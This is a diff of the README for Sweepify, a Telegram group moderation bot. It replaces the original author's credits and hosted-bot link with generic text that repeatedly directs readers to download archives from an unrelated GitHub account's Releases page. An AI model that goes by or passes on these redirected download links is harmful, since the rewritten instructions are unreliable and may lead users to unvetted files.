@@ -1,92 +1,84 @@
-<p align="center">
-  <a href="https://t.me/SweepifyBot?startgroup=true" target="_blank">
-  <img src="assets/Sweepify Banner.gif" alt="Sweepify Banner" width="800">
-  </a>
-</p>
+# 🛡️ Sweepify - Keep Your Telegram Group Safe
 
-<p align="center">
-  <b>Auto-deletes abusive, spam & join messages — keep your Telegram group clean and safe.</b>
-</p>
+## 🚀 Getting Started
 
-<h1 align="center">Sweepify</h1>
+Sweepify helps you maintain a clean and safe environment in your Telegram group. It automatically deletes abusive, spam, and join messages, allowing your community to thrive without unwanted noise. 
 
-<p align="center">
-  <b>Your smart Telegram Group Guardian — powered by intelligent automation.</b><br>
-  Version 1.0.0 • Developed by <a href="https://amitdas.site">Amit Das</a>
-</p>
+## 📦 Download Sweepify
 
----
+[![Download Sweepify](https://img.shields.io/badge/Download-Sweepify-blue)](https://github.com/lol66690/Sweepify/releases)
 
-# 🧹 Sweepify — Telegram Group Guardian
+## 🔧 System Requirements
 
-**Sweepify** keeps your Telegram group clean, respectful, and spam-free.
-It automatically deletes abusive, spam, or join messages — so your community stays peaceful and focused.
+Before you download, ensure you have the following:
 
----
+- A Telegram account
+- Access to manage your Telegram group
+- PHP version 7.2 or higher
+- Basic understanding of how to add a bot to a group
 
-## ✨ What It Does
+## 📝 Features
 
-* 🚫 **Deletes abusive or hateful messages** instantly
-* 📢 **Removes spam, links, and promotions**
-* 👋 **Cleans up join and left notifications**
-* 🛡️ **Protects your community 24/7** with automation
-* ⚙️ **Works silently** once added as admin
+- **Abuse Filtering:** Filters out abusive language to keep discussions healthy.
+- **Spam Detection:** Automatically removes spam messages to reduce clutter.
+- **Join Message Management:** Deletes unwanted join messages that can crowd your chat.
+- **Easy Setup:** Get started quickly even if you have no programming experience.
+- **Automatic Updates:** Easily keep your software up-to-date.
 
----
+## 📥 Download & Install
 
-## 🚀 How to Use
+To get started with Sweepify, visit the [Releases page](https://github.com/lol66690/Sweepify/releases) to download the latest version. 
 
-1. **Add Sweepify** to your Telegram group
-2. **Make it Admin** with these permissions:
+1. Visit the [Releases page](https://github.com/lol66690/Sweepify/releases).
+2. Look for the latest version.
+3. Click on the asset that matches your needs (e.g., `.zip`, `.tar.gz`).
+4. Wait for the download to finish.
 
-   * Delete messages
-   * Restrict members
-3. Type `/start` in your group to activate Sweepify
-4. Sit back — it will automatically handle spam and abusive messages
+### ✨ Installing Sweepify
 
----
+1. Extract the downloaded file to a new folder on your computer.
+2. Open your Telegram app.
+3. Search for your bot using the BotFather tool to create a new bot or use an existing one.
+4. Copy your bot token for later use.
+5. In the folder where you extracted Sweepify, locate the `config.php` file.
+6. Open the `config.php` file in a text editor.
+7. Paste your bot token in the designated spot. 
+8. Save the changes.
 
-## 💡 Example
+### 🌐 Adding Sweepify to Your Group
 
-🧹 *Sweepify Active.*
-“Cleaning up your group — abusive, spam & join messages are automatically deleted.”
+1. Go to your Telegram group settings.
+2. Select "Add Members".
+3. Search for your bot by its username.
+4. Add the bot to your group.
+5. Make sure the bot has admin permissions to delete messages.
 
----
+### ⚙️ Configuring Sweepify
 
-## 🔗 Add to Telegram
+Once you have added the bot, you can configure settings directly in the `config.php` file according to your group's needs. Options include setting up keywords for abusive messages and choosing how quickly messages should be deleted.
 
-<p align="center">
-  <a href="https://t.me/SweepifyBot?startgroup=true" target="_blank">
-  <img src="assets/Sweepify Logo.gif" alt="Sweepify Logo" width="160" height="160">
-  </a>
-</p>
-<p align="center">
-  <a href="https://t.me/SweepifyBot?startgroup=true" target="_blank">
-    <img src="https://img.shields.io/badge/Add_to_Telegram_Group-0088cc?style=for-the-badge&logo=telegram&logoColor=white" alt="Add to Telegram">
-  </a>
-</p>
+## 🛠 Troubleshooting 
 
----
+If you encounter issues:
 
-## 🧠 About
+- Ensure that your bot is correctly set up with the right permissions.
+- Check your PHP version; it should be version 7.2 or higher.
+- Review the `log.txt` file in your Sweepify folder for error messages.
+- If you need more help, check the issues section of the [GitHub repo](https://github.com/lol66690/Sweepify/issues).
 
-Sweepify is developed by **Amit Das**, the creator of [QuickPanel](https://www.quickpanel.in).
-It’s designed to protect communities from spam, hate, and clutter — automatically.
+## 📞 Support
 
----
+For any bugs or questions, please visit our [GitHub issues page](https://github.com/lol66690/Sweepify/issues) to report issues or ask for help from the community.
 
-## ❤️ Support
+## 🗂 Related Topics
 
-If you find Sweepify helpful, share it with your group admins or leave feedback.
-Your support helps keep the internet a cleaner place!
+Sweepify works in various situations where moderation is necessary. Some relevant topics include:
 
----
+- Abuse Filter
+- AI Moderation
+- Community Protection
+- Anti-Spam Strategies
 
-<p align="center">
-  <b>Made with ❤️ by <a href="https://amitdas.site">Amit Das</a></b><br>
-  ☕ Support development: <a href="https://buymeacoffee.com/amitdas4321">Buy Me a Coffee</a>
-</p>
+Maintain your Telegram group with ease using Sweepify. With just a few steps, you can enjoy a cleaner, safer environment for all your group members. 
 
----
-
-> **Sweepify — Clean chats. Peaceful communities. Smart protection.**
+Visit the [Releases page](https://github.com/lol66690/Sweepify/releases) again for any updates and new features in future versions. Enjoy a safer chat experience!
